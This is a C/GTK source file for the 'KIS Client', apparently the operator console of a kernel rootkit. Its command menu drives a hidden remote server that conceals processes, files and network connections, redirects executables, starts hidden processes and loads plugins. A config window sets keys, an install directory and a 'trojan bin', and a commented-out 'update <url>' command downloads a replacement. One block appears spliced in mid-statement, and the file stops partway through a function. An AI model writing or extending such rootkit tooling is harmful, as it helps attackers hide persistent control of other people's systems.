#ifdef HAVE_CONFIG_H
#  include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <gdk/gdkkeysyms.h>
#include <gtk/gtk.h>
#include <pthread.h>
#include "callbacks.h"
#include "interface.h"
#include "support.h"

GtkWidget *window;
GtkWidget *results_text;
GtkWidget *ctree;
GtkWidget *args_box;
GtkWidget *server_address_box;
GtkWidget *mod_spin;
GtkWidget *rem_spin;
GtkWidget *key1;
GtkWidget *key2;
GtkWidget *install_dir;
GtkWidget *trojan_bin;
GtkWidget *file_select;
GtkWidget *scrolledwindow3;
GtkWidget *command_label;
GtkWidget *args_label;
GtkCTreeNode *ctree_node;
char menuname[64];

void build_ctree(void)
{
  if(ctree != NULL)
	gtk_widget_destroy(ctree);

  ctree = gtk_ctree_new (2, 0);
  gtk_widget_ref (ctree);
  gtk_object_set_data_full (GTK_OBJECT (window), "ctree", ctree,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (ctree);
  gtk_container_add (GTK_CONTAINER (scrolledwindow3), ctree);
  gtk_clist_set_column_width (GTK_CLIST (ctree), 0, 120);
  gtk_clist_set_column_width (GTK_CLIST (ctree), 1, 80);
  gtk_clist_column_titles_show (GTK_CLIST (ctree));
  command_label = gtk_label_new (_("command"));
  gtk_widget_ref (command_label);
  gtk_object_set_data_full (GTK_OBJECT (window), "command_label", command_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (command_label);
  gtk_clist_set_column_widget (GTK_CLIST (ctree), 0, command_label);

  args_label = gtk_label_new (_("argument format"));
  gtk_widget_ref (args_label);
  gtk_object_set_data_full (GTK_OBJECT (window), "args_label", args_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (args_label);
  gtk_clist_set_column_widget (GTK_CLIST (ctree), 1, args_label);

  ctree_node = add_ctree_node("server control", "", NULL);
  add_ctree_node("ping", "pings server", ctree_node);
  add_ctree_node("shutdown", "must enter \"yes\" to shutdown", ctree_node);
  add_ctree_node("remove", "must enter \"yes\" to remove server", ctree_node);
  ctree_node = add_ctree_node("plugins", "", NULL);
  add_ctree_node("list_func", "<plugin name> (optional)", ctree_node);
  add_ctree_node("load_plugin", "<plugin name> (all for all plugins)", ctree_node);
  add_ctree_node("unload_plugin", "<plugin name> (all for all plugins)", ctree_node);
  ctree_node = add_ctree_node("process control", "", NULL);
  add_ctree_node("list_phides", "", ctree_node);
  add_ctree_node("hide_proc", "<pid>", ctree_node);
  add_ctree_node("unhide_proc", "<pid> (pid 0 to unhide all)", ctree_node);
  add_ctree_node("start_proc", "h|u <command>", ctree_node);
  add_ctree_node("list_redir", "<exec> (leave blank to list all)", ctree_node);
  add_ctree_node("exec_redir", "<orig exec> <new exec>", ctree_node);
  add_ctree_node("rm_redir", "<exec> (use 0 to remove all)", ctree_node);
  ctree_node = add_ctree_node("fs control", "", NULL);
  add_ctree_node("list_fhides", "", ctree_node);
  add_ctree_node("hide_file", "<filename>", ctree_node);
  add_ctree_node("unhide_file", "<filename>", ctree_node);
  ctree_node = add_ctree_node("network control", "", NULL);
  add_ctree_node("list_nhides", "", ctree_node);
  add_ctree_node("hide_net", "<string> (can be ip or :port)", ctree_node);
  add_ctree_node("unhide_net", "<string> (can be ip or :port)", ctree_node);

  gtk_signal_connect(GTK_OBJECT(ctree), "tree_select_row", GTK_SIGNAL_FUNC(on_ctree_highlight), NULL);

  return;
}

GtkCTreeNode *add_ctree_node(char *col1, char *col2, GtkCTreeNode *parent)
{
	GtkCTreeNode *tmp;
	char *ctext[2];
	strncpy(menuname, col1, sizeof(menuname));
	ctext[0] = col1;
	ctext[1] = col2;
	if(parent == NULL)
	{
		tmp = gtk_ctree_insert_node(GTK_CTREE(ctree), NULL, NULL, ctext, 0, NULL, NULL, NULL, NULL, FALSE, FALSE);
		gtk_ctree_node_set_selectable(GTK_CTREE(ctree), tmp, FALSE);
		return tmp;
	}
	tmp = gtk_ctree_insert_node(GTK_CTREE(ctree), parent, NULL, ctext, 0, NULL, NULL, NULL, NULL, TRUE, FALSE);
	return tmp;
}

GtkWidget *create_window (void)
{
  GtkWidget *vbox1;
  GtkWidget *menubar;
  guint tmp_key;
  GtkWidget *file;
  GtkWidget *file_menu;
  GtkAccelGroup *file_menu_accels;
  GtkWidget *clear_buffer;
  GtkWidget *save_buffer;
  GtkWidget *separator1;
  GtkWidget *exit;
  GtkWidget *options;
  GtkWidget *options_menu;
  GtkAccelGroup *options_menu_accels;
  GtkWidget *server_config;
  GtkWidget *client_config;
  GtkWidget *about;
  GtkWidget *vpaned1;
  GtkWidget *hbox2;
  GtkWidget *vbox2;
  guint send_button_key;
  GtkWidget *send_button;
  GtkWidget *pixmap1;
  GtkWidget *scrolledwindow1;
  GtkAccelGroup *accel_group;
  GtkTooltips *tooltips;

  tooltips = gtk_tooltips_new ();

  accel_group = gtk_accel_group_new ();

  window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
  gtk_object_set_data (GTK_OBJECT (window), "window", window);
  gtk_window_set_title (GTK_WINDOW (window), _("KIS Client 0.9 - http://www.uberhax0r.net/kis"));
  gtk_window_set_default_size (GTK_WINDOW (window), 600, 500);

  vbox1 = gtk_vbox_new (FALSE, 0);
  gtk_widget_ref (vbox1);
  gtk_object_set_data_full (GTK_OBJECT (window), "vbox1", vbox1,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (vbox1);
  gtk_container_add (GTK_CONTAINER (window), vbox1);

  menubar = gtk_menu_bar_new ();
  gtk_widget_ref (menubar);
  gtk_object_set_data_full (GTK_OBJECT (window), "menubar", menubar,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (menubar);
  gtk_box_pack_start (GTK_BOX (vbox1), menubar, FALSE, FALSE, 0);

  file = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (file)->child),
                                   _("_file"));
  gtk_widget_add_accelerator (file, "activate_item", accel_group,
                              tmp_key, GDK_MOD1_MASK, 0);
  gtk_widget_ref (file);
  gtk_object_set_data_full (GTK_OBJECT (window), "file", file,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (file);
  gtk_container_add (GTK_CONTAINER (menubar), file);

  file_menu = gtk_menu_new ();
  gtk_widget_ref (file_menu);
  gtk_object_set_data_full (GTK_OBJECT (window), "file_menu", file_menu,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_menu_item_set_submenu (GTK_MENU_ITEM (file), file_menu);
  file_menu_accels = gtk_menu_ensure_uline_accel_group (GTK_MENU (file_menu));

  clear_buffer = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (clear_buffer)->child),
                                   _("_clear buffer"));results_text = gtk_text_new (NULL, NULL);
  gtk_widget_ref (results_text);
  gtk_object_set_data_full (GTK_OBJECT (window), "results_text", results_text,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (results_text);

  gtk_widget_add_accelerator (clear_buffer, "activate_item", file_menu_accels,
                              tmp_key, 0, 0);
  gtk_widget_ref (clear_buffer);
  gtk_object_set_data_full (GTK_OBJECT (window), "clear_buffer", clear_buffer,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (clear_buffer);
  gtk_container_add (GTK_CONTAINER (file_menu), clear_buffer);

  save_buffer = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (save_buffer)->child),
                                   _("_save buffer"));
  gtk_widget_add_accelerator (save_buffer, "activate_item", file_menu_accels,
                              tmp_key, 0, 0);
  gtk_widget_ref (save_buffer);
  gtk_object_set_data_full (GTK_OBJECT (window), "save_buffer", save_buffer,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (save_buffer);
  gtk_container_add (GTK_CONTAINER (file_menu), save_buffer);

  separator1 = gtk_menu_item_new ();
  gtk_widget_ref (separator1);
  gtk_object_set_data_full (GTK_OBJECT (window), "separator1", separator1,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (separator1);
  gtk_container_add (GTK_CONTAINER (file_menu), separator1);
  gtk_widget_set_sensitive (separator1, FALSE);

  exit = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (exit)->child),
                                   _("e_xit"));
  gtk_widget_add_accelerator (exit, "activate_item", file_menu_accels,
                              tmp_key, 0, 0);
  gtk_widget_ref (exit);
  gtk_object_set_data_full (GTK_OBJECT (window), "exit", exit,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (exit);
  gtk_container_add (GTK_CONTAINER (file_menu), exit);
  gtk_widget_add_accelerator (exit, "activate", accel_group,
                              GDK_X, GDK_MOD1_MASK,
                              GTK_ACCEL_VISIBLE);

  options = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (options)->child),
                                   _("_options"));
  gtk_widget_add_accelerator (options, "activate_item", accel_group,
                              tmp_key, GDK_MOD1_MASK, 0);
  gtk_widget_ref (options);
  gtk_object_set_data_full (GTK_OBJECT (window), "options", options,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (options);
  gtk_container_add (GTK_CONTAINER (menubar), options);

  options_menu = gtk_menu_new ();
  gtk_widget_ref (options_menu);
  gtk_object_set_data_full (GTK_OBJECT (window), "options_menu", options_menu,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_menu_item_set_submenu (GTK_MENU_ITEM (options), options_menu);
  options_menu_accels = gtk_menu_ensure_uline_accel_group (GTK_MENU (options_menu));

  server_config = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (server_config)->child),
                                   _("_server config"));
  gtk_widget_add_accelerator (server_config, "activate_item", options_menu_accels,
                              tmp_key, 0, 0);
  gtk_widget_ref (server_config);
  gtk_object_set_data_full (GTK_OBJECT (window), "server_config", server_config,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (server_config);
  gtk_container_add (GTK_CONTAINER (options_menu), server_config);
  gtk_widget_add_accelerator (server_config, "activate", accel_group,
                              GDK_E, GDK_MOD1_MASK,
                              GTK_ACCEL_VISIBLE);

  client_config = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (client_config)->child),
                                   _("_client config"));
  gtk_widget_add_accelerator (client_config, "activate_item", options_menu_accels,
                              tmp_key, 0, 0);
  gtk_widget_ref (client_config);
  gtk_object_set_data_full (GTK_OBJECT (window), "client_config", client_config,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (client_config);
  gtk_container_add (GTK_CONTAINER (options_menu), client_config);
  gtk_widget_add_accelerator (client_config, "activate", accel_group,
                              GDK_C, GDK_MOD1_MASK,
                              GTK_ACCEL_VISIBLE);

  about = gtk_menu_item_new_with_label ("");
  tmp_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (about)->child),
                                   _("_about"));
  gtk_widget_add_accelerator (about, "activate_item", accel_group,
                              tmp_key, GDK_MOD1_MASK, 0);
  gtk_widget_ref (about);
  gtk_object_set_data_full (GTK_OBJECT (window), "about", about,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (about);
  gtk_container_add (GTK_CONTAINER (menubar), about);
  gtk_menu_item_right_justify (GTK_MENU_ITEM (about));

  vpaned1 = gtk_vpaned_new ();
  gtk_widget_ref (vpaned1);
  gtk_object_set_data_full (GTK_OBJECT (window), "vpaned1", vpaned1,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (vpaned1);
  gtk_box_pack_start (GTK_BOX (vbox1), vpaned1, TRUE, TRUE, 0);
  gtk_paned_set_position (GTK_PANED (vpaned1), 198);

  hbox2 = gtk_hbox_new (FALSE, 0);
  gtk_widget_ref (hbox2);
  gtk_object_set_data_full (GTK_OBJECT (window), "hbox2", hbox2,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (hbox2);
  gtk_paned_pack1 (GTK_PANED (vpaned1), hbox2, FALSE, TRUE);

  scrolledwindow3 = gtk_scrolled_window_new (NULL, NULL);
  gtk_widget_ref (scrolledwindow3);
  gtk_object_set_data_full (GTK_OBJECT (window), "scrolledwindow3", scrolledwindow3,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (scrolledwindow3);
  gtk_box_pack_start (GTK_BOX (hbox2), scrolledwindow3, TRUE, TRUE, 0);
  gtk_widget_set_usize (scrolledwindow3, 350, -2);
/*
  ctree = gtk_ctree_new (2, 0);
  gtk_widget_ref (ctree);
  gtk_object_set_data_full (GTK_OBJECT (window), "ctree", ctree,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (ctree);
  gtk_container_add (GTK_CONTAINER (scrolledwindow3), ctree);
  gtk_clist_set_column_width (GTK_CLIST (ctree), 0, 120);
  gtk_clist_set_column_width (GTK_CLIST (ctree), 1, 80);
  gtk_clist_column_titles_show (GTK_CLIST (ctree));

  command_label = gtk_label_new (_("command"));
  gtk_widget_ref (command_label);
  gtk_object_set_data_full (GTK_OBJECT (window), "command_label", command_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (command_label);
  gtk_clist_set_column_widget (GTK_CLIST (ctree), 0, command_label);

  args_label = gtk_label_new (_("argument format"));
  gtk_widget_ref (args_label);
  gtk_object_set_data_full (GTK_OBJECT (window), "args_label", args_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (args_label);
  gtk_clist_set_column_widget (GTK_CLIST (ctree), 1, args_label);
 
  ctree_node = add_ctree_node("server control", "", NULL);
  add_ctree_node("shutdown", "", ctree_node);
  add_ctree_node("remove", "all|server|hidden (default is server)", ctree_node);
  add_ctree_node("update", "<url> (download and replace with)", ctree_node);
  ctree_node = add_ctree_node("plugins", "", NULL);
  add_ctree_node("list_func", "<plugin name> (optional)", ctree_node);
  add_ctree_node("load_plugin", "<plugin name> (all for all plugins)", ctree_node);
  add_ctree_node("unload_plugin", "<plugin name> (all for all plugins)", ctree_node);
  ctree_node = add_ctree_node("process control", "", NULL);
  add_ctree_node("list_phides", "", ctree_node);
  add_ctree_node("hide_proc", "<pid>", ctree_node);
  add_ctree_node("unhide_proc", "<pid> (pid 0 to unhide all)", ctree_node);
  add_ctree_node("start_proc", "h|u <command>", ctree_node);
  add_ctree_node("list_redir", "<exec> (leave blank to list all)", ctree_node);
  add_ctree_node("exec_redir", "<orig exec> <new exec>", ctree_node);
  add_ctree_node("rm_redir", "<exec> (use 0 to remove all)", ctree_node);
  ctree_node = add_ctree_node("fs control", "", NULL);
  add_ctree_node("list_fhides", "", ctree_node);
  add_ctree_node("hide_file", "<filename>", ctree_node);
  add_ctree_node("unhide_file", "<filename>", ctree_node);
  ctree_node = add_ctree_node("network control", "", NULL);
  add_ctree_node("list_nhides", "", ctree_node);
  add_ctree_node("hide_net", "<string> (can be ip or :port)", ctree_node);
  add_ctree_node("unhide_net", "<string> (can be ip or :port)", ctree_node);

  gtk_signal_connect(GTK_OBJECT(ctree), "tree_select_row", GTK_SIGNAL_FUNC(on_ctree_highlight), NULL);
*/
  build_ctree();
  vbox2 = gtk_vbox_new (FALSE, 0);
  gtk_widget_ref (vbox2);
  gtk_object_set_data_full (GTK_OBJECT (window), "vbox2", vbox2,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (vbox2);
  gtk_box_pack_start (GTK_BOX (hbox2), vbox2, TRUE, TRUE, 0);

  server_address_box = gtk_entry_new ();
  gtk_widget_ref (server_address_box);
  gtk_object_set_data_full (GTK_OBJECT (window), "server_address_box", server_address_box,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (server_address_box);
  gtk_box_pack_start (GTK_BOX (vbox2), server_address_box, FALSE, FALSE, 0);
  gtk_tooltips_set_tip (tooltips, server_address_box, _("format: ip:port (use port 0 to specify random destination port)"), NULL);

  send_button = gtk_button_new_with_label ("");
  send_button_key = gtk_label_parse_uline (GTK_LABEL (GTK_BIN (send_button)->child),
                                   _("_send"));
				  
  gtk_widget_add_accelerator (send_button, "clicked", accel_group,
                              send_button_key, GDK_MOD1_MASK, 0);
			      
  gtk_widget_ref (send_button);
  gtk_object_set_data_full (GTK_OBJECT (window), "send_button", send_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_signal_connect (GTK_OBJECT (send_button), "clicked",
                      GTK_SIGNAL_FUNC (on_send_button_clicked),
                      NULL);

  gtk_widget_show (send_button);
  gtk_box_pack_start (GTK_BOX (vbox2), send_button, FALSE, FALSE, 0);
  gtk_container_set_border_width (GTK_CONTAINER (send_button), 1);
  GTK_WIDGET_SET_FLAGS (send_button, GTK_CAN_DEFAULT);
  gtk_widget_add_accelerator (send_button, "clicked", accel_group,
                              GDK_Return, 0,
                              GTK_ACCEL_VISIBLE);

  args_box = gtk_entry_new ();
  gtk_widget_ref (args_box);
  gtk_object_set_data_full (GTK_OBJECT (window), "args_box", args_box,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (args_box);
  gtk_box_pack_start (GTK_BOX (vbox2), args_box, FALSE, FALSE, 0);

  pixmap1 = create_pixmap (window, "kis_logo.xpm");
  gtk_widget_ref (pixmap1);
  gtk_object_set_data_full (GTK_OBJECT (window), "pixmap1", pixmap1,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (pixmap1);
  gtk_box_pack_start (GTK_BOX (vbox2), pixmap1, TRUE, TRUE, 0);

  scrolledwindow1 = gtk_scrolled_window_new (NULL, NULL);
  gtk_widget_ref (scrolledwindow1);
  gtk_object_set_data_full (GTK_OBJECT (window), "scrolledwindow1", scrolledwindow1,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (scrolledwindow1);
  gtk_paned_pack2 (GTK_PANED (vpaned1), scrolledwindow1, TRUE, TRUE);
  gtk_scrolled_window_set_policy (GTK_SCROLLED_WINDOW (scrolledwindow1), GTK_POLICY_NEVER, GTK_POLICY_ALWAYS);

  results_text = gtk_text_new (NULL, NULL);
  gtk_widget_ref (results_text);
  gtk_object_set_data_full (GTK_OBJECT (window), "results_text", results_text,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (results_text);
  gtk_container_add (GTK_CONTAINER (scrolledwindow1), results_text);

  gtk_signal_connect (GTK_OBJECT (window), "destroy",
                      GTK_SIGNAL_FUNC (on_window_destroy),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (clear_buffer), "activate",
                      GTK_SIGNAL_FUNC (on_clear_buffer_activate),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (save_buffer), "activate",
                      GTK_SIGNAL_FUNC (on_save_buffer_activate),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (exit), "activate",
                      GTK_SIGNAL_FUNC (on_exit_activate),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (server_config), "activate",
                      GTK_SIGNAL_FUNC (on_server_config_activate),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (client_config), "activate",
                      GTK_SIGNAL_FUNC (on_client_config_activate),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (about), "activate",
                      GTK_SIGNAL_FUNC (on_about_activate),
                      NULL);

  gtk_object_set_data (GTK_OBJECT (window), "tooltips", tooltips);

  gtk_window_add_accel_group (GTK_WINDOW (window), accel_group);
  return window;
}

GtkWidget*
create_server_config_window (void)
{
  GtkWidget *server_config_window;
  GtkWidget *vbox3;
  GtkWidget *table1;
  GtkWidget *mod_label;
  GtkObject *mod_spin_adj;
  GtkWidget *rem_label;
  GtkObject *rem_spin_adj;
  GtkWidget *key1_label;
  GtkWidget *key2_label;
  GtkWidget *install_label;
  GtkWidget *trojan_label;
  GtkWidget *hbox3;
  GtkWidget *save_button;
  GtkWidget *ok_button;
  GtkWidget *cancel_button;

  server_config_window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
  gtk_object_set_data (GTK_OBJECT (server_config_window), "server_config_window", server_config_window);
  gtk_window_set_title (GTK_WINDOW (server_config_window), _("Server Config"));

  vbox3 = gtk_vbox_new (FALSE, 0);
  gtk_widget_ref (vbox3);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "vbox3", vbox3,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (vbox3);
  gtk_container_add (GTK_CONTAINER (server_config_window), vbox3);

  table1 = gtk_table_new (6, 2, FALSE);
  gtk_widget_ref (table1);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "table1", table1,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (table1);
  gtk_box_pack_start (GTK_BOX (vbox3), table1, TRUE, TRUE, 0);
  gtk_container_set_border_width (GTK_CONTAINER (table1), 1);
  gtk_table_set_row_spacings (GTK_TABLE (table1), 5);
  gtk_table_set_col_spacings (GTK_TABLE (table1), 5);

  mod_label = gtk_label_new (_("modulus"));
  gtk_widget_ref (mod_label);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "mod_label", mod_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (mod_label);
  gtk_table_attach (GTK_TABLE (table1), mod_label, 0, 1, 0, 1,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (mod_label), 0, 0.5);

  mod_spin_adj = gtk_adjustment_new (1, 0, 64, 1, 10, 10);
  mod_spin = gtk_spin_button_new (GTK_ADJUSTMENT (mod_spin_adj), 1, 0);
  gtk_widget_ref (mod_spin);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "mod_spin", mod_spin,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_spin_button_set_value(GTK_SPIN_BUTTON(mod_spin), (gfloat) mod);			 
  gtk_widget_show (mod_spin);
  gtk_table_attach (GTK_TABLE (table1), mod_spin, 1, 2, 0, 1,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);

  rem_label = gtk_label_new (_("remainder"));
  gtk_widget_ref (rem_label);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "rem_label", rem_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (rem_label);
  gtk_table_attach (GTK_TABLE (table1), rem_label, 0, 1, 1, 2,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (rem_label), 0, 0.5);

  rem_spin_adj = gtk_adjustment_new (0, 0, 64, 1, 10, 10);
  rem_spin = gtk_spin_button_new (GTK_ADJUSTMENT (rem_spin_adj), 1, 0);
  gtk_widget_ref (rem_spin);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "rem_spin", rem_spin,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_spin_button_set_value(GTK_SPIN_BUTTON(rem_spin), (gfloat) rem);		    
  gtk_widget_show (rem_spin);
  gtk_table_attach (GTK_TABLE (table1), rem_spin, 1, 2, 1, 2,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);

  key1_label = gtk_label_new (_("key1"));
  gtk_widget_ref (key1_label);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "key1_label", key1_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (key1_label);
  gtk_table_attach (GTK_TABLE (table1), key1_label, 0, 1, 2, 3,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (key1_label), 0, 0.5);

  key1 = gtk_entry_new ();
  gtk_widget_ref (key1);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "key1", key1,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_entry_set_text(GTK_ENTRY(key1), (gchar *) k1);
  gtk_widget_show (key1);
  gtk_table_attach (GTK_TABLE (table1), key1, 1, 2, 2, 3,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_entry_set_visibility (GTK_ENTRY (key1), FALSE);

  key2_label = gtk_label_new (_("key2"));
  gtk_widget_ref (key2_label);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "key2_label", key2_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (key2_label);
  gtk_table_attach (GTK_TABLE (table1), key2_label, 0, 1, 3, 4,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (key2_label), 0, 0.5);

  key2 = gtk_entry_new ();
  gtk_widget_ref (key2);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "key2", key2,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_entry_set_text(GTK_ENTRY(key2), (gchar *) k2);
  gtk_widget_show (key2);
  gtk_table_attach (GTK_TABLE (table1), key2, 1, 2, 3, 4,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_entry_set_visibility (GTK_ENTRY (key2), FALSE);

  install_label = gtk_label_new (_("install dir"));
  gtk_widget_ref (install_label);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "install_label", install_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (install_label);
  gtk_table_attach (GTK_TABLE (table1), install_label, 0, 1, 4, 5,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (install_label), 0, 0.5);

  install_dir = gtk_entry_new ();
  gtk_widget_ref (install_dir);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "install_dir", install_dir,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_entry_set_text(GTK_ENTRY(install_dir), (gchar *) inst_dir);
  gtk_widget_show (install_dir);
  gtk_table_attach (GTK_TABLE (table1), install_dir, 1, 2, 4, 5,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);

  trojan_label = gtk_label_new (_("trojan bin"));
  gtk_widget_ref (trojan_label);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "trojan_label", trojan_label,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (trojan_label);
  gtk_table_attach (GTK_TABLE (table1), trojan_label, 0, 1, 5, 6,
                    (GtkAttachOptions) (GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);
  gtk_misc_set_alignment (GTK_MISC (trojan_label), 0, 0.5);

  trojan_bin = gtk_entry_new ();
  gtk_widget_ref (trojan_bin);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "trojan_bin", trojan_bin,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_entry_set_text(GTK_ENTRY(trojan_bin), (gchar *) trj_bin);			
  gtk_widget_show (trojan_bin);
  gtk_table_attach (GTK_TABLE (table1), trojan_bin, 1, 2, 5, 6,
                    (GtkAttachOptions) (GTK_EXPAND | GTK_FILL),
                    (GtkAttachOptions) (0), 0, 0);

  hbox3 = gtk_hbox_new (FALSE, 0);
  gtk_widget_ref (hbox3);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "hbox3", hbox3,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (hbox3);
  gtk_box_pack_start (GTK_BOX (vbox3), hbox3, TRUE, TRUE, 0);

  save_button = gtk_button_new_with_label (_("save"));
  gtk_widget_ref (save_button);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "save_button", save_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (save_button);
  gtk_box_pack_start (GTK_BOX (hbox3), save_button, FALSE, FALSE, 0);

  ok_button = gtk_button_new_with_label (_("ok"));
  gtk_widget_ref (ok_button);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "ok_button", ok_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (ok_button);
  gtk_box_pack_start (GTK_BOX (hbox3), ok_button, FALSE, FALSE, 0);

  cancel_button = gtk_button_new_with_label (_("cancel"));
  gtk_widget_ref (cancel_button);
  gtk_object_set_data_full (GTK_OBJECT (server_config_window), "cancel_button", cancel_button,
                            (GtkDestroyNotify) gtk_widget_unref);
  gtk_widget_show (cancel_button);
  gtk_box_pack_start (GTK_BOX (hbox3), cancel_button, FALSE, FALSE, 0);

  gtk_signal_connect (GTK_OBJECT (mod_spin), "changed",
                      GTK_SIGNAL_FUNC (on_mod_spin_changed),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (save_button), "clicked",
                      GTK_SIGNAL_FUNC (on_save_button_clicked),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (ok_button), "clicked",
                      GTK_SIGNAL_FUNC (on_ok_button_clicked),
                      NULL);
  gtk_signal_connect (GTK_OBJECT (cancel_button), "clicked",
                      GTK_SIGNAL_FUNC (on_cancel_button_clicked),
                      NULL);

  return server_config_window;
}

GtkWidget*
create_file_select (gchar *fstype)
{

  GtkWidget *ok_button1;
  GtkWidget *cancel_button1;

  file_select = gtk_file_selection_new (_(fstype));
  gtk_object_set_data (GTK_OBJECT (file_select), "file_select", file_select);
  gtk_container_set_border_width (GTK_CONTAINER (file_select), 10);

  ok_button1 = GTK_FILE_SELECTION (file_select)->ok_button;
